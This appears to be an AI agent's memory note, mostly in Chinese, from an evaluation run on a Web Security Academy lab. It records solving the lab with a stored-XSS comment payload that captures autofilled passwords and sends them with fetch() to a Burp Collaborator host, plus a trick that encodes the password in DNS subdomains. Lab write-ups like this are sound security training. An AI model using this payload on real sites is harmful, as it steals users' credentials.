---
metadata:
  node_type: memory
name: "PRS arm A lab-capturing-passwords"
description: "arm A 基线:lab-capturing-passwords 一次解出 - 评论存储 XSS + Collaborator 窃取 administrator 口令;两坑=无 exploit server/victim 每页只 autofill 首对凭证、body 面 base64 记录丢字节"
last_updated: 2026-10-09T04:23:57+08:00
created: 2026-10-09T04:23:57+08:00
---

## 2026-10-09 arm A 基线

lab: /web-security/cross-site-scripting/exploiting/lab-capturing-passwords
instance: https://0a6a004003c4c0d48255201e00a000ae.web-security-academy.net/ (jar /tmp/cj1.json, reused:false)
lab_id: 08d9e37603cfe2ef7cf8a21c19e9fc73e81bb5d992fe2e876f8b6891b1759d43

结论: solved(banner_verdict solved=true, "Congratulations, you solved the lab!")

链路
1. range_launch launch-url 直取实例;exploit_server=null —— 本 lab 实例头无 exploit server,外传面只能走 Burp Collaborator(题面亦明说必须用 Collaborator 默认公共服)。
2. 受害者自动浏览所有评论,无需投递动作;评论体即存储 XSS(postId 页 /post?postId=N 的 /post/comment,csrf+postId+comment+name+email+website)。
3. 载荷 `<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://<collab>',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">`;受害者密码管理器 autofill 两个字段,onchange 触发外传。
4. burp_collab new 取 oastify 标签,poll 读回 HTTP 交互。

四个坑(均可复证)
- 每页只 autofill 首对凭证:post 3 已有首个载荷后,同页第二个载荷永不触发(重复 id/probably 只为首个表单填值)。换 postId 7 重发即触发。
- burp_collab 的 HTTP body 面记录丢字节:raw_request_b64 的 Content-Length 报 34,base64 解出仅 33,且丢的是中段字符(得 oebi02hlrp7022afb02,真值 oebi02hplrp7022afb02)——口令看似完整实为残值,直接登录判假。
- 修法:把值编进 DNS 子域标签(host 前两段),burp_collab 的 sub_domain 是明文,不受 body 截断影响,一次拿全 20 字符口令。
- 对照组 wiener:peter 在本 lab 无效(该 lab 无 wiener 账号),故登录被判失败时不能只归因于捕获值。

凭证: administrator:oebi02hplrp7022afb02 → POST /login(csrf 会话内稳定,可复用)→ 302 /my-account?id=administrator → banner solved。

